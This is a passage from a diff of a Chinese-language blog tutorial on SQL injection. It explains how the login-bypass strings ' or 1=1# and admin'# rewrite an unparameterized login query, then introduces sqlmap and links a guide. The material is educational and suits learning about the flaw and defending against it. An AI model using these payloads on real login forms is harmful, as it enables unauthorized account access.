+<pre tabindex="0"><code>&#39;or 1=1# 
+</code></pre><p>这样sql语句就变成了：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#c678dd">user</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">name</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;admin &#39;</span> <span style="color:#c678dd">AND</span> <span style="color:#e06c75">password</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;&#39;</span><span style="color:#c678dd">or</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span><span style="color:#56b6c2">#</span> <span style="color:#98c379">&#39;
+</span></span></span></code></pre></div><p><strong>我们竟然直接登录了管理员的账号，这是为什么呢？</strong></p>
+<p>一般没有进行SQL语句参数化的登录语句是这样的：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#c678dd">user</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">name</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;xxx&#39;</span> <span style="color:#c678dd">AND</span> <span style="color:#e06c75">password</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;xxx&#39;</span>
+</span></span></code></pre></div><p>数据库管理系统DBMS会判断返回的行数，如果有返回行，证明账号和密码是正确的，即登录成功</p>
+<p>而在我们输入万能密码后，sql语句变成了：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">Select</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">From</span> 用户表 <span style="color:#c678dd">Where</span> <span style="color:#e06c75">UserName</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">xxx</span> <span style="color:#c678dd">and</span> <span style="color:#e06c75">Password</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;&#39;</span> <span style="color:#c678dd">or</span> <span style="color:#d19a66">1</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span><span style="color:#56b6c2">#</span><span style="color:#98c379">&#39;&#39;</span>
+</span></span></code></pre></div><p>or是或者的意思，也就是Password=xxx的时候可以登录，也可以是1=1的时候可以登录</p>
+<p>但1永远等于1，所以登录条件永远成立！</p>
+<p>或者换一种方式，我们直接在账号处就使用：</p>
+<pre tabindex="0"><code>admin&#39;# 
+</code></pre><p>密码随便填写，这样sql语句就是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#c678dd">user</span> <span style="color:#c678dd">WHERE</span> <span style="color:#e06c75">name</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;admin&#39;</span><span style="color:#56b6c2">#</span> <span style="color:#98c379">&#39; AND password = &#39;</span><span style="color:#e06c75">xxx</span><span style="color:#98c379">&#39;
+</span></span></span></code></pre></div><p>完全忽略了密码的校验，也就顺利登录了管理员账号</p>
 <p><span style="color:#2c8af0;font-size:20px"><strong>恭喜，你现在已经学会了手工注入！</strong></span></p>
 <p><span style="color:aqua;font-size:20px"><strong>呃，可是这也太麻烦了吧，又要判断这个又要试那个的，难道没有更简单的方法吗?</strong></span></p>
 <p><span style="color:#2c8af0;font-size:30px"><strong>当然是有的！那就是使用自动化注入工具&ndash;SqlMap！</strong></span></p>
@@ -2141,6 +2376,18 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 	
 ></p>
 <p>同样可以得到正确结果</p>
+<p>详细的sqlmap学习请参考这位师傅的文章，非常完整，无与伦比的好：</p>
+<p><a class="link" href="https://www.tr0y.wang/2018/03/21/sqlmap-guide/#sqlmap-%E7%9A%84%E5%90%84%E4%B8%AA%E9%98%B6%E6%AE%B5"  target="_blank" rel="noopener"
+    >Tr0y&rsquo;s Blog&ndash;SQLmap 使用手册
+    
+    <span style="white-space: nowrap;"><svg width=".7em"
+        height=".7em" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
+        <path d="m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z" fill="currentColor" />
+        <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"
+            fill="currentColor">
+    </svg></span>
+    
+</a></p>
 
 </section>
 
@@ -2164,7 +2411,7 @@ XPATH syntax error: &#39;~b882cf99~&#39;
 
 
         <span>
-            最后更新于 2025-07-02
+            最后更新于 2025-07-09
         </span>
     </section></footer>
 
